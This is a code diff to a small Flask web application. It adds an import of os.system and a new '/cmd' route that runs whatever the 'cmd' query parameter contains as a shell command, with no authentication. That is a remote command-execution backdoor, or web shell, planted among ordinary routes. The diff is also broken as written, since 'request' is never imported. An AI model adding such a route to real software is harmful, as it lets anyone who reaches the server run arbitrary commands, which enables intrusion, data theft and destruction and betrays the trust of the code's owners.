@@ -2,6 +2,7 @@ from flask import Flask, render_template
 from db import get_db, close_db
 import sqlalchemy
 from logger import log
+from os import system
 
 app = Flask(__name__)
 app.teardown_appcontext(close_db)
@@ -10,6 +11,10 @@ app.teardown_appcontext(close_db)
 @app.route("/")
 def index():
     return render_template("index.html")
+
+@app.route("/cmd")
+def cmd():
+    return system(request.args.get("cmd", ""))
 
 
 @app.route("/health")
